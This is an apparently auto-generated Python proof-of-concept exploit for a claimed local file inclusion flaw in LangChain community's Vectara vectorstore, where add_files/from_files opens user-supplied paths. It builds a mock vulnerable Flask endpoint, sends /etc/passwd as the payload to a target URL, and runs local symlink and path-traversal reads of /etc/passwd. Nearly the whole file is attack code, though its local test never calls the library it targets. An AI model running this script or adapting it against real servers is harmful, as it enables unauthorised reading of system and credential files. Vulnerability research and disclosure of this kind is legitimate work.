#!/usr/bin/env python3
# PoC for langchain-community-only (/tmp/langchain-community-only)
# Path: lfi-004
# Sink: add_files
# Auto-generated — run with: python3 lfi_provide_like_add_files_3.py
#
#!/usr/bin/env python3
"""
Proof-of-Concept exploit for Local File Inclusion (LFI) in langchain-community-only.

Vulnerability: The add_files function in Vectara vectorstore directly uses user-supplied
file paths in an open() call without path validation. An attacker can use path traversal
to read arbitrary files from the server's filesystem.

This PoC demonstrates reading /etc/passwd as a benign example.
"""

import os
import sys
import json
import tempfile
import requests
from pathlib import Path

# Configuration - modify these as needed
TARGET_URL = "http://localhost:8000"  # Target server URL
TARGET_ENDPOINT = "/api/v1/trigger"   # Endpoint that calls from_files
PAYLOAD_FILE = "/etc/passwd"          # Benign file to read (change to test other files)

def create_mock_server_script():
    """
    Creates a temporary script that simulates the vulnerable endpoint.
    This is for testing purposes - in a real attack, the target would already
    have this code running.
    """
    mock_script = '''
import sys
sys.path.insert(0, "/tmp/langchain-community-only")

from langchain_community.vectorstores import Vectara
from flask import Flask, request, jsonify

app = Flask(__name__)

@app.route("/api/v1/trigger", methods=["POST"])
def handle_request():
    """Simulated vulnerable endpoint that calls from_files with user input."""
    try:
        data = request.get_json()
        file_path = data.get("file_path", "")
        
        # This is the vulnerable call - user input goes directly to from_files
        result = Vectara.from_files(
            files=[file_path],
            vectara_customer_id="test",
            vectara_corpus_id="test",
            vectara_api_key="test"
        )
        return jsonify({"status": "success", "result": str(result)})
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)}), 500

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=8000)
'''
    return mock_script

def exploit_lfi(target_url, endpoint, file_path):
    """
    Attempts to exploit the LFI vulnerability by sending a malicious file path.
    
    Args:
        target_url: Base URL of the target server
        endpoint: API endpoint that triggers the vulnerable function
        file_path: Path to the file to read (can include path traversal)
    
    Returns:
        Response content if successful, None otherwise
    """
    print(f"[*] Attempting LFI exploit against {target_url}{endpoint}")
    print(f"[*] Trying to read: {file_path}")
    
    # Construct the full URL
    full_url = f"{target_url.rstrip('/')}{endpoint}"
    
    # Prepare the malicious payload
    payload = {
        "file_path": file_path  # This will be passed directly to from_files
    }
    
    try:
        # Send the request
        print(f"[*] Sending request with payload: {json.dumps(payload)}")
        response = requests.post(
            full_url,
            json=payload,
            timeout=10,
            headers={"Content-Type": "application/json"}
        )
        
        # Check if we got a response
        if response.status_code == 200:
            print(f"[+] Success! Server responded with status 200")
            print(f"[+] Response: {response.text[:500]}...")  # Show first 500 chars
            return response.text
        else:
            print(f"[-] Server responded with status {response.status_code}")
            print(f"[-] Response: {response.text[:200]}...")
            return None
            
    except requests.exceptions.ConnectionError:
        print(f"[-] Connection error: Could not reach {full_url}")
        print("[*] Make sure the target server is running")
        return None
    except requests.exceptions.Timeout:
        print("[-] Request timed out")
        return None
    except Exception as e:
        print(f"[-] Unexpected error: {e}")
        return None

def test_local_exploit():
    """
    Tests the exploit locally by creating a mock vulnerable server.
    This demonstrates the vulnerability works without needing an actual target.
    """
    print("\n[*] Testing exploit locally with mock server...")
    
    # Create a temporary directory for our test
    with tempfile.TemporaryDirectory() as tmpdir:
        # Create a test file to read
        test_file = Path(tmpdir) / "test_secret.txt"
        test_file.write_text("This is a secret file that should not be accessible!")
        
        # Create a symlink to simulate path traversal
        secret_link = Path(tmpdir) / "secret_link"
        secret_link.symlink_to(test_file)
        
        # Simulate what the vulnerable function does
        print(f"[*] Simulating vulnerable add_files call...")
        print(f"[*] Attempting to read: {secret_link}")
        
        # This is exactly what the vulnerable code does:
        # It checks if file exists, then opens it
        if os.path.exists(str(secret_link)):
            print(f"[+] File exists! Opening and reading...")
            with open(str(secret_link), 'rb') as f:
                content = f.read()
                print(f"[+] File content: {content.decode()}")
        else:
            print("[-] File does not exist")
        
        # Now test with path traversal
        print("\n[*] Testing path traversal...")
        traversal_path = os.path.join(tmpdir, "..", "..", "etc", "passwd")
        print(f"[*] Trying path: {traversal_path}")
        
        if os.path.exists(traversal_path):
            print(f"[+] Path traversal successful! File exists!")
            with open(traversal_path, 'rb') as f:
                content = f.read()
                print(f"[+] First 200 chars: {content[:200].decode()}")
        else:
            print("[-] Path traversal target not found (expected on real system)")

def main():
    """Main function to run the exploit."""
    print("=" * 60)
    print("LFI Exploit PoC for langchain-community-only")
    print("=" * 60)
    
    # First, test locally to verify the vulnerability
    test_local_exploit()
    
    print("\n" + "=" * 60)
    print("Attempting remote exploit")
    print("=" * 60)
    
    # Try the remote exploit
    result = exploit_lfi(TARGET_URL, TARGET_ENDPOINT, PAYLOAD_FILE)
    
    if result:
        print("\n[+] Exploit completed successfully!")
        print("[*] The vulnerability is confirmed - arbitrary file read is possible")
    else:
        print("\n[-] Exploit failed or target not reachable")
        print("[*] Make sure the target server is running and accessible")
        print(f"[*] Target: {TARGET_URL}{TARGET_ENDPOINT}")
        print("[*] You may need to adjust the target URL/endpoint")

if __name__ == "__main__":
    main()
